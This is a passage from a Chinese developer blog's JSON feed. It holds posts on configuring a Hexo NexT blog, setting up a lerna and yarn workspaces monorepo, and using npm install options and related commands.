aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h2 id=\"开启字数统计和阅读时长\" tabindex=\"-1\"> 开启字数统计和阅读时长</h2>\n<h3 id=\"安装-hexo-wordcount\" tabindex=\"-1\"> 安装 hexo-wordcount</h3>\n<div><pre><code><span>npm</span> <span>install</span> hexo-wordcount --save\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"编辑主题配置文件-1\" tabindex=\"-1\"> 编辑主题配置文件</h3>\n<p><code>./themes/next/_config.yml</code></p>\n<div><pre><code><span>post_wordcount</span><span>:</span>\n  <span>item_text</span><span>:</span> <span>true</span>\n<span>wordcount</span><span>:</span> <span>true</span>\n<span>min2read</span><span>:</span> <span>true</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h1 id=\"我的配置-只写出部分配置\" tabindex=\"-1\"> 我的配置（只写出部分配置）</h1>\n<h2 id=\"站点配置文件\" tabindex=\"-1\"> 站点配置文件</h2>\n<p><code>./_config.yml</code></p>\n<div><pre><code><span>#</span>\nSite\n<span>language</span><span>:</span> zh <span>-</span> Hans\n\n<span># search</span>\n<span>search</span><span>:</span>\n    <span>path</span><span>:</span> search.xml\n<span>field</span><span>:</span> post\n\n<span># URL</span>\n<span>url</span><span>:</span> . /\n\n    <span>#Writing</span>\n<span>highlight</span><span>:</span>\n    <span>enable</span><span>:</span> <span>true</span>\n<span>line_number</span><span>:</span> <span>true</span>\n<span>auto_detect</span><span>:</span> <span>true</span>\n<span>tab_replace</span><span>:</span>\n\n    <span>#Pagination</span>\n<span>per_page</span><span>:</span> <span>5</span>\n<span>pagination_dir</span><span>:</span> page\n\n<span># Extensions</span>\n<span>theme</span><span>:</span> next\n\n<span># Deployment</span>\n<span>deploy</span><span>:</span>\n    <span>type</span><span>:</span> git\n<span>repo</span><span>:</span> <span>git @github.com</span><span>:</span> vxhly / vxhly.github.io.git\n<span>branch</span><span>:</span> master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"主题配置文件文件\" tabindex=\"-1\"> 主题配置文件文件</h2>\n<p><code>./themes/next/_config.yml</code></p>\n<div><pre><code><span># Specify the date when the site was setup</span>\n<span>since</span><span>:</span> <span>2016</span>\n\n<span># Footer `powered-by` and `theme-info` copyright</span>\n<span>copyright</span><span>:</span> <span>true</span>\n\n<span>menu</span><span>:</span>\n  <span>home</span><span>:</span> /\n  <span>category</span><span>:</span> /categories\n  <span>#about: /about</span>\n  <span>archives</span><span>:</span> /archives\n  <span>tags</span><span>:</span> /tags\n  <span>#sitemap: /sitemap.xml</span>\n  <span>commonweal</span><span>:</span> /404.html\n\n<span># Schemes</span>\n<span>#scheme: Muse</span>\n<span>scheme</span><span>:</span> Mist\n<span>#scheme: Pisces</span>\n\n<span># Social Links</span>\n<span>social</span><span>:</span>\n  <span>#LinkLabel: Link</span>\n  <span>GitHub</span><span>:</span> //github.com/vxhly\n  <span>Weibo</span><span>:</span> //weibo.com/5039312152\n\n<span># Automatically scroll page to section which is under &lt;!-- more --> mark.</span>\n<span>scroll_to_more</span><span>:</span> <span>true</span>\n\n<span># Automatically Excerpt. Not recommand.</span>\n<span>auto_excerpt</span><span>:</span>\n  <span>enable</span><span>:</span> <span>true</span>\n  <span>length</span><span>:</span> <span>150</span>\n\n<span># Code Highlight theme</span>\n<span>highlight_theme</span><span>:</span> night eighties\n\n<span># Duoshuo ShortName</span>\n<span>duoshuo_shortname</span><span>:</span> vxhly\n  <span>enable</span><span>:</span> <span>true</span>\n  <span>length</span><span>:</span> <span>150</span>\n\n<span># Post wordcount display settings</span>\n<span>post_wordcount</span><span>:</span>\n\n    <span>item_text</span><span>:</span> <span>true</span>\n\n<span>wordcount</span><span>:</span> <span>true</span>\n<span>min2read</span><span>:</span> <span>true</span>\n\n<span># Share</span>\n<span>duoshuo_share</span><span>:</span> <span>true</span>\n\n<span># Make duoshuo show UA</span>\n<span>duoshuo_info</span><span>:</span>\n  <span>ua_enable</span><span>:</span> <span>true</span>\n  <span>admin_enable</span><span>:</span> <span>true</span>\n  <span>user_id</span><span>:</span> <span>13846473</span>\n  <span>admin_nickname</span><span>:</span> Author\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"腾讯公益-404-页面\" tabindex=\"-1\"> 腾讯公益 404 页面</h2>\n<p><code>./themes/next/source/404.html</code></p>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>\n<span><span><span>&lt;</span>html</span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>content-type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=utf-8;<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>X-UA-Compatible<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>IE=edge,chrome=1<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>\"</span>robots<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>all<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>\"</span>robots<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>index,follow<span>\"</span></span> <span>/></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span>\n    <span><span><span>&lt;</span>script</span>\n      <span>type</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span>\n      <span>src</span><span><span>=</span><span>\"</span>//www.qq.com/404/search_children.js<span>\"</span></span>\n      <span>charset</span><span><span>=</span><span>\"</span>utf-8<span>\"</span></span>\n      <span>homePageUrl</span><span><span>=</span><span>\"</span>/<span>\"</span></span>\n      <span>homePageName</span><span><span>=</span><span>\"</span>回到我的主页<span>\"</span></span>\n    <span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n  <span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-08-03T13:11:30.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "基于 lerna + yarn workspaces 的 monorepo 项目实践",
      "url": "https://vxhly.github.io/views/nodejs/learning-lerna-and-yarn-worspaces.html",
      "id": "https://vxhly.github.io/views/nodejs/learning-lerna-and-yarn-worspaces.html",
      "summary": "前言\n观察到 GitHub 上面有很多的开源项目使用到了 lerna 和 yarn workspaces 来管理项目中的多包依赖, 好奇起它的实现过程, 于是便写下本篇博文来记录我的填坑过程。\n\n",
      "content_html": "<div><p>前言</p>\n<p>观察到 GitHub 上面有很多的开源项目使用到了 lerna 和 yarn workspaces 来管理项目中的多包依赖, 好奇起它的实现过程, 于是便写下本篇博文来记录我的填坑过程。</p>\n</div>\n\n<h2 id=\"参考资料\" tabindex=\"-1\"> 参考资料</h2>\n<p>先贴上我的参考资料来源</p>\n<ol>\n<li>lerna 官网: <a href=\"https://lerna.js.org/\" target=\"_blank\" rel=\"noopener noreferrer\">lerna.js.org/</a></li>\n<li>lerna 仓库：<a href=\"https://github.com/lerna/lerna/\" target=\"_blank\" rel=\"noopener noreferrer\">github.com/lerna/lerna/</a></li>\n<li>yarn workspaces：<a href=\"https://classic.yarnpkg.com/zh-Hans/docs/workspaces\" target=\"_blank\" rel=\"noopener noreferrer\">classic.yarnpkg.com/zh-Hans/docs/workspaces/</a></li>\n</ol>\n<p>当然也得感谢前人栽的树</p>\n<ol>\n<li><a href=\"https://juejin.im/post/6844903954329894920\" target=\"_blank\" rel=\"noopener noreferrer\">Lerna 多包管理的搭建指南</a></li>\n<li><a href=\"https://www.jianshu.com/p/8b7e6025354b\" target=\"_blank\" rel=\"noopener noreferrer\">lerna 的基础使用</a></li>\n</ol>\n<h2 id=\"背景\" tabindex=\"-1\"> 背景</h2>\n<p>团队内多项目开发经常会遇到以下几个问题</p>\n<ol>\n<li>新建项目需要重新配置各种工具, 繁琐, 虽然也可以用脚手架生成, 但后期涉及到依赖的升级也麻烦</li>\n<li>项目内的依赖互相引用虽然有 yarn/npm link, 但还是影响开发体验</li>\n<li>babel 等配置希望可以多项目共享</li>\n</ol>\n<h3 id=\"前端开发-package-面临的问题\" tabindex=\"-1\"> 前端开发 package 面临的问题</h3>\n<p>在最初开开发 package 的时候, 还属于一种刀耕火种的阶段。没有什么自动化的工具。发布 package 的时候, 都是手动修改版本号(PS: 当然也可以通过脚本工具来升级版本号)。如果 packages 数量不多还可以接受。但是当数量逐渐增多的时候, 且这些 packages 之间还有依赖关系的时候, 在版本号上的管理无法形成统一, 这就对开发人员来说就很痛苦了。工作不仅繁琐, 而且需要用掉不少时间。</p>\n<p>举个例子, 如果你要维护两个 package。分别为 module-1, module-2。</p>\n<p>下面是这两个 package 的依赖关系。</p>\n<div><pre><code><span>// module-1 package.json</span>\n<span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"module-1\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.0.0\"</span><span>,</span>\n  <span>\"dependencies\"</span><span>:</span> <span>{</span>\n    <span>\"module-2\"</span><span>:</span> <span>\"^1.0.0\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// module-2 package.json</span>\n<span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"module-2\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.0.0\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>在这样的环境下, module-1 是依赖 module-2 的。如果 module-2 有修改, 需要发布。那么你的工作有这些。</p>\n<p>修改 module-2 版本号, 发布。修改 module-1 的依赖关系, 修改 module-1 的版本号, 发布。</p>\n<p>这还仅仅只有两个 package, 如果依赖关系更复杂, 大家可以想想发布的工作量有多大。</p>\n<h2 id=\"什么是-lernajs\" tabindex=\"-1\"> 什么是 lernaJs</h2>\n<p>lernaJs 是由 Babel 团队出的一个多包管理工具, 是 GitHub 上面开源的一款 js 代码库管理软件, 用来对一系列相互耦合比较大、又相互独立的 js git 库进行管理。因为 Babel 包含很多子包, 以前都是放在多个仓库里的, 管理比较困难, 特别是有调用系统内包的时候, 发布比较麻烦。所以为了能更好更快的跨包管理, babel 推出了 lernaJs, 使用了 monorepo 的概念, 现在 React,Babel,Angular,Jest 都在使用这个工具来管理包。</p>\n<p>对于一些功能比较全的库, 我们往往会把各个小功能拆分成独立的 npm 库, 他们直接有比较强的依赖关系。可以解决各个库之间修改混乱、难以跟踪的问题。lerna 可以优化这种情形下的工作流。</p>\n<h2 id=\"什么是-yarn-workspaces\" tabindex=\"-1\"> 什么是 yarn workspaces</h2>\n<p>Workspace 能更好的统一管理有多个项目的仓库, 既可在每个项目下使用独立的 package.json 管理依赖, 又可便利的享受一条 yarn 命令安装或者升级所有依赖等。更重要的是可以使多个项目共享同一个 node_modules 目录, 提升开发效率和降低磁盘空间占用。一句话总结就是可以大大简化对多个项目的统一管理。很多知名的开源项目也使用了 Yarn Workspace, 如 vue、react、jest 等使用 lerna 结合 yarn workspaces 各个 package 理论上都是独立的, 所以每个 package 都维护着自己的 dependencies, 而很大的可能性, package 之间有不少相同的依赖, 而这就可能使 install 时出现重复安装, 使本来就很大的 node_modues 继续膨胀。简单的说如果不使用 yarn workspaces 的话, 会导致在安装依赖时, 子包重复安装依赖项。使用 yarn workspaces 时, 我们就可以将这些依赖提至到工作根区。</p>\n<h3 id=\"代码库结构\" tabindex=\"-1\"> 代码库结构</h3>\n<p>lerna 管理的库文件结构类似如下这样</p>\n<div><pre><code>my-lerna-repo\n  |\n  |- packages\n  |    |\n  |    |- package-1\n  |    |    |\n  |    |    └─ package.json\n  |    |\n  |    └─ package-2\n  |         |\n  |         └─ package.json\n  |\n  |- package.json\n  |\n  └─ lerna.json\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"lerna-主要做了什么\" tabindex=\"-1\"> lerna 主要做了什么</h3>\n<ol>\n<li>通过 lerna 的命令 <code>lerna bootstrap</code> 将会把代码库进行 link。</li>\n<li>通过 <code>lerna publish</code> 发布最新改动的库</li>\n</ol>\n<h3 id=\"lerna-的更多知识\" tabindex=\"-1\"> lerna 的更多知识</h3>\n<div><p>提示</p>\n<p>这边不多阐述 lerna 的相关命令以及其的相关知识点, 有兴趣的贴上地址 <a href=\"/views/nodejs/usage-lerna.html\">lerna 的使用指南</a></p>\n</div>\n<h2 id=\"什么是-monorepo\" tabindex=\"-1\"> 什么是 monorepo</h2>\n<p>monorepo 是比较于 multi-package 的。multi-package 就是建立多个仓库, 每个包建立一个仓库。而 monorepo 是建立一个仓库, 多个包都在这个仓库中管理, 这样可以有两个好处：</p>\n<ol>\n<li>各个包之间的沟通更加的方便, 如果 multi-package 的话, 系统内其中一个包修改, 需要单独发版, 而且引用这个包的其他包都需要发版。使用 lerna 的话可以自动管理这些包的发版, 很方便。</li>\n<li>一些可以共用的配置, 比如 eslint,babel,rollup 等, 可以统一的管理这些开发配置。</li>\n</ol>\n<h2 id=\"代码库的结构\" tabindex=\"-1\"> 代码库的结构</h2>\n<div><p>提示</p>\n<p>这边节选 <a href=\"https://github.com/vuejs/vue-next\" target=\"_blank\" rel=\"noopener noreferrer\">vue-next</a> 的项目结构来讲解实现过程贴上我已经实现好的 <a href=\"https://github.com/vxhly/my-lerna-repo\" target=\"_blank\" rel=\"noopener noreferrer\">my-lerna-repo</a></p>\n</div>\n<p>创建目录结构如下</p>\n<div><pre><code>my-lerna-repo\n  |\n  |- packages\n  |\n  |- package.json\n  |\n  └─ lerna.json\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>当然你也可以通过 <code>lerna</code> 的命令来创建</p>\n<div><pre><code>lerna init my-lerna-repo\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改你的 <code>lerna.json</code> 来支持 yarn workspaces</p>\n<div><pre><code><span>{</span>\n  <span>\"npmClient\"</span><span>:</span> <span>\"yarn\"</span><span>,</span>\n  <span>\"packages\"</span><span>:</span> <span>[</span><span>\"packages/*\"</span><span>]</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.0.0\"</span><span>,</span>\n  <span>\"useWorkspaces\"</span><span>:</span> <span>true</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>还需要在 <code>package.json</code> 中添加以下配置来开启 yarn workspaces</p>\n<div><pre><code><span>{</span>\n  <span>\"private\"</span><span>:</span> <span>true</span><span>,</span>\n  <span>\"workspaces\"</span><span>:</span> <span>[</span><span>\"packages/*\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>接着就是安装依赖项, 你可以通过以下命令来安装</p>\n<div><pre><code>lerna bootstrap\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2020-10-26T12:13:34.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "浅谈 Node.js 中的 npm",
      "url": "https://vxhly.github.io/views/nodejs/talk-npm-on-node-js.html",
      "id": "https://vxhly.github.io/views/nodejs/talk-npm-on-node-js.html",
      "summary": "前言\n主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。\n\n",
      "content_html": "<div><p>前言</p>\n<p>主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。</p>\n</div>\n\n<h2 id=\"npm-是什么\" tabindex=\"-1\"> npm 是什么</h2>\n<div><p>简介</p>\n<p>NPM 的全称是 Node Package Manager, 是随同 Node.js 一起安装的包管理和分发工具, 它很方便让 JavaScript 开发者下载、安装、上传以及管理已经安装的包。</p>\n</div>\n<h2 id=\"npm-install-安装模块\" tabindex=\"-1\"> npm install 安装模块</h2>\n<div><p>提示</p>\n<p>安装包, 默认会安装最新的版本, 最后所有的依赖会存放在 <code>node_modules</code> 目录下的, 如:</p>\n</div>\n<div><pre><code>$ <span>npm</span> <span>install</span> gulp\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"全局安装\" tabindex=\"-1\"> 全局安装</h3>\n<div><p>提示</p>\n<p>只需加上 <code>-g</code> 或者 <code>--global</code> 参数, 就可以实现全局安装, 如:</p>\n</div>\n<div><pre><code>$ <span>npm</span> <span>install</span> gulp -g\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装指定版本\" tabindex=\"-1\"> 安装指定版本</h3>\n<div><pre><code>$ <span>npm</span> <span>install</span> gulp@3.9.1\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"s-save\" tabindex=\"-1\"> -S, --save</h2>\n<h3 id=\"添加模块命令\" tabindex=\"-1\"> 添加模块命令</h3>\n<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save\n$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -S\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"作用\" tabindex=\"-1\"> 作用</h3>\n<div><p>作用</p>\n<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code> （生产阶段的依赖）部分, 避免了手动添加。</p>\n</div>\n<p><code>package.json</code> 文件的 <code>dependencies</code> 字段:</p>\n<div><pre><code><span>\"dependencies\"</span><span>:</span> <span>{</span>\n  <span>\"[module-name]\"</span><span>:</span> <span>\"^[version]\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"d-save-dev\" tabindex=\"-1\"> -D, --save-dev</h2>\n<h3 id=\"添加模块命令-1\" tabindex=\"-1\"> 添加模块命令</h3>\n<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-dev\n$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -D\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"作用-1\" tabindex=\"-1\"> 作用</h3>\n<div><p>作用</p>\n<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>devDependencies</code> （开发阶段的依赖）部分, 避免了手动添加。</p>\n</div>\n<p><code>package.json</code> 文件的 <code>devDependencies</code> 字段:</p>\n<div><pre><code><span>\"devDependencies\"</span><span>:</span> <span>{</span>\n  <span>\"[module-name]\"</span><span>:</span> <span>\"^[version]\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"o-save-optional\" tabindex=\"-1\"> -O, --save-optional</h2>\n<h3 id=\"添加模块命令-2\" tabindex=\"-1\"> 添加模块命令</h3>\n<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-optional\n$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -O\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"作用-2\" tabindex=\"-1\"> 作用</h3>\n<div><p>作用</p>\n<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>optionalDependencies</code> （可选阶段的依赖）部分, 避免了手动添加。</p>\n</div>\n<p><code>package.json</code> 文件的 <code>optionalDependencies</code> 字段:</p>\n<div><pre><code><span>\"optionalDependencies\"</span><span>:</span> <span>{</span>\n  <span>\"[module-name]\"</span><span>:</span> <span>\"^[version]\"</span>\n<span>}</span><span>,</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"e-save-exact\" tabindex=\"-1\"> -E, --save-exact</h2>\n<h3 id=\"添加模块命令-3\" tabindex=\"-1\"> 添加模块命令</h3>\n<div><pre><code>$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> --save-exact\n$ <span>npm</span> <span>install</span> <span>[</span>module-name<span>]</span> -E\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"作用-3\" tabindex=\"-1\"> 作用</h3>\n<div><p>作用</p>\n<p>自动把模块和版本号添加至 <code>package.json</code> 的 <code>dependencies</code> （精确安装指定模块版本）部分, 避免了手动添加。需要注意的是: <code>package.json</code> 文件的 <code>dependencies</code> 字段, 版本号中的 <code>^</code> 消失了</p>\n</div>\n<p><code>package.json</code> 文件的 <code>dependencies</code> 字段</p>\n<div><pre><code><span>\"dependencies\"</span><span>:</span> <span>{</span>\n  <span>\"[module-name]\"</span><span>:</span> <span>\"[version]\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"npm-其他命令\" tabindex=\"-1\"> npm 其他命令</h2>\n<h3 id=\"查看依赖包的所有的版本号\" tabindex=\"-1\"> 查看依赖包的所有的版本号</h3>\n<div><pre><code>$ <span>npm</span> info <span>[</span>package-name<span>]</span> versions\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"创建-package-json-文件\" tabindex=\"-1\"> 创建 package.json 文件</h3>\n<div><p>提示</p>\n<p>安装包的信息可保持到项目的 <code>package.json</code> 文件中, 以便后续的其它的项目开发或者他人合作使用, 也说 <code>package.json</code> 在项目中是必不可少的。</p>\n</div>\n<div><pre><code>$ <span>npm</span> init\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装模块\" tabindex=\"-1\"> 安装模块</h3>\n<div><p>提示</p>\n<p>模块的依赖都被写入了 <code>package.json</code> 文件后, 他人打开项目的根目录（项目开源、内部团队合作）, 时, 只需一条命令就可以安装 <code>package.json</code> 中的依赖。</p>\n</div>\n<div><pre><code>$ <span>npm</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>加上 <code>--save</code> 会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。 :::</p>\n<div><pre><code>$ <span>npm</span> <span>install</span> --save\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"卸载模块\" tabindex=\"-1\"> 卸载模块</h3>\n<p>想要卸载模块也很简单。</p>\n<div><pre><code>$ <span>npm</span> uninstall <span>[</span>module-name<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>以上写法并不会改变 <code>package.json</code> 文件, 使用 <code>-S | --save | -D | --save-dev | -O | --save-optional</code> 选项即可删除 <code>package.json</code> 文件中的依赖。<br> 如使用 <code>--save</code> 选项, 将会删除 <code>package.json</code> 文件 <code>dependencies</code> 中的该模块名和版本号。</p>\n</div>\n</div>\n<div><pre><code>$ <span>npm</span> uninstall <span>[</span>module-name<span>]</span> --save\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"更新模块\" tabindex=\"-1\"> 更新模块</h3>\n<div><p>提示</p>\n<p>从服务器下载最新版本的模块。需要注意的是, 最新版本的模块并不是最稳定的, 模块还是选择相对稳定的版本较好。支持 <code>-g</code> 选项。</p>\n</div>\n<div><pre><code>$ <span>npm</span> update <span>[</span>-g<span>]</span> <span>[</span>module-name<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"检查模块是否已经过时\" tabindex=\"-1\"> 检查模块是否已经过时</h3>\n<div><p>提示</p>\n<p>此命令会列出所有已经过时的包, 可以及时进行包的更新.</p>\n</div>\n<div><pre><code>$ <span>npm</span> outdated\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"启动模块\" tabindex=\"-1\"> 启动模块</h3>\n<div><pre><code>$ <span>npm</span> start <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>该命令写在 <code>package.json</code> 文件 <code>scripts</code> 的 <code>start</code> 字段中, 可以自定义命令来配置一个服务器环境和安装一系列的必要程序, 如:</p>\n</div>\n<div><pre><code><span>\"scripts\"</span><span>:</span> <span>{</span>\n  <span>\"start\"</span><span>:</span> <span>\"gulp -s\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>如果 <code>package.json</code> 文件没有设置 <code>start</code> , 则将直接启动 <code>node server.js</code></p>\n</div>\n<h3 id=\"停止模块\" tabindex=\"-1\"> 停止模块</h3>\n<div><pre><code>$ <span>npm</span> stop <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重新启动模块\" tabindex=\"-1\"> 重新启动模块</h3>\n<div><pre><code>$ <span>npm</span> restart <span>[</span>-- <span>&lt;</span>args<span>></span><span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"更新模块-1\" tabindex=\"-1\"> 更新模块</h3>\n<p>可以安装全局插件</p>\n<div><pre><code>$ <span>npm</span> <span>install</span> -g npm-check-updates\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>查看最新的版本</p>\n<div><pre><code>$ npm-check-updates\n$ ncu <span># 为上一条指令的缩写</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>升级至最新版本</p>\n<div><pre><code>$ ncu -a\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在使用下载最新的安装包</p>\n<div><pre><code>$ <span>npm</span> update\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>当然, 如果所有包都是最新版本, 执行 ncu 后会提示:</p>\n<div><pre><code>All dependencies match the latest package versions <span>:</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"查看包的安装路径\" tabindex=\"-1\"> 查看包的安装路径</h3>\n<div><p>提示</p>\n<p>输出 node_modules 的路径, 支持 <code>-g</code> 选项。</p>\n</div>\n<div><pre><code>$ <span>npm</span> root <span>[</span>-g<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"管理-npm-的配置路径\" tabindex=\"-1\"> 管理 npm 的配置路径</h3>\n<div><p>提示</p>\n<p>对于 config 这块用得最多应该是设置代理, 解决 npm 安装一些模块失败的问题</p>\n</div>\n<div><pre><code>$ <span>npm</span> config <span>set</span> <span>&lt;</span>key<span>></span> <span>&lt;</span>value<span>></span> <span>[</span>-g<span>|</span>--global<span>]</span>\n$ <span>npm</span> config delete <span>&lt;</span>key<span>></span>\n$ <span>npm</span> config list\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"查看命令的帮助\" tabindex=\"-1\"> 查看命令的帮助</h3>\n<div><pre><code>$ <span>npm</span> <span>help</span> <span>&lt;</span>command<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"区别\" tabindex=\"-1\"> 区别</h2>\n<ol>\n<li><code>--save-dev</code> 是你开发时候依赖的东西； <code>--save</code> 是你发布之后还依赖的东西。</li>\n<li><code>--save-optional</code> 是可选依赖, 非必下； <code>--save-exact</code> 可以指定精确的版本号, 也就是说当发布了新版本, 系统不会系在最新版本的模块, 只会下载该版本的模块。</li>\n<li><code>npm install</code> 下载依赖时会安装 <code>package.json</code> 中 <code>dependencies</code> 和 <code>devDependencies</code> 里的所有模块。</li>\n<li><code>npm install --save</code> 下载依赖时只会安装 <code>package.json</code> 中 <code>dependencies</code> 里的所有模块。</li>\n<li>比如, 你写 <code>ES6</code> 代码, 如果你想编译成 <code>ES5</code> 发布那么 <code>babel</code> 就是 <code>devDependencies</code> 。</li>\n<li>如果你用了 <code>jQuery</code> , 由于发布之后还是依赖 <code>jQuery</code> , 所以是 <code>dependencies</code> 。</li>\n<li>最常用的还是 <code>npm</code> 中的 <code>--save</code> 和 <code>--save-dev</code> 选项。 <code>--save</code> 和 <code>--save-dev</code> 选项。</li>\n</ol>\n",
      "date_published": "2016-08-26T15:30:10.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "解读 npm 中的 package.json",
      "url": "https://vxhly.github.io/views/nodejs/talk-package-json-on-npm.html",
      "id": "https://vxhly.github.io/views/nodejs/talk-package-json-on-npm.html",
